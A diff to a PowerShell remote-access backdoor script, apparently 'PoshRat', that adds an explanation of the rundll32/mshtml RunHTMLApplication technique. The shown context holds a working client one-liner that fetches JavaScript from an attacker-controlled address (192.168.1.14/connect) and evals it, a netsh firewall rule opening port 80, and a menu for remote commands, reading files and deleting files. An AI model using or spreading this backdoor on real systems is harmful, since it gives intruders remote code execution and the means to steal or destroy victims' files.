@@ -14,6 +14,33 @@
   Client:
   cmd line:
   rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");w=new%20ActiveXObject("WScript.Shell");try{v=w.RegRead("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet%20Settings\\ProxyServer");q=v.split("=")[1].split(";")[0];h.SetProxy(2,q);}catch(e){}h.Open("GET","http://192.168.1.14/connect",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
+  
+  ---
+  Explanation :
+  1. RunDll32
+	Parses the command and decides the intended DLL is: javascript:"\..\mshtml
+	Fails at loading that as an absolute path.
+	Fails to find a match in the working directory or on the path.
+	Fails to find a manifest javascript:"\..\mshtml.manifestfor the module.
+	Calls LoadLibrary
+	
+  2. LoadLibrary
+	Adds the extension and attempts to load javascript:"\..\mshtml.dll
+	Treats this as relative, so it goes up from the fake javascript:"\ directory.
+	Searches for mshtml.dll which it finds in the System directory.
+	Loads the DLL using RunHTMLApplication as the entry point.
+	
+  3. RunHTMLApplication
+	Attempts to execute the command ";alert('foo');
+	As that's invalid Javascript it calls GetCommandLine for the original command which returns  javascript:"\..\mshtml,RunHTMLApplication ";alert('foo');
+	Attempts to open this URI so it asks the system how to handle the javascript protocol which is typically set to Microsoft HTML Javascript Pluggable Protocol in the registry.
+	Then executes the Javascript: "..\mshtml,RunHTMLApplication ";alert('foo');
+	
+  4. Javascript
+	The first statement creates a string and does nothing with it which is valid enough to not cause an error.
+	Continues executing the rest of the script.
+  
+  
 #>
 
 $Server = '192.168.1.14' #Listening IP. Change This.
@@ -43,7 +70,7 @@ netsh advfirewall firewall delete rule name="PoshRat 80" | Out-Null
 netsh advfirewall firewall add rule name="PoshRat 80" dir=in action=allow protocol=TCP localport=80 | Out-Null
 
 $listener.Start()
-'Listening ...'
+'Listening on host 192.168.1.14 ...'
 while ($true)
 {
     	$context = $listener.GetContext() # blocks until request is received
@@ -55,7 +82,7 @@ while ($true)
 	if ($request.Url -match '/connect$' -and ($request.HttpMethod -eq "GET"))
 	{
      		write-host "Usage:" -fore Green
-		write-host "      cmd:          	just input the cmd command" -fore Green
+			write-host "      cmd:          	just input the cmd command" -fore Green
      		write-host "      delete file:  	input:delete,then set the file path" -fore Green
      		write-host "      exitbackdoor: 	input:exit" -fore Green
      		write-host "      read file:    	input:read,then set the file path" -fore Green
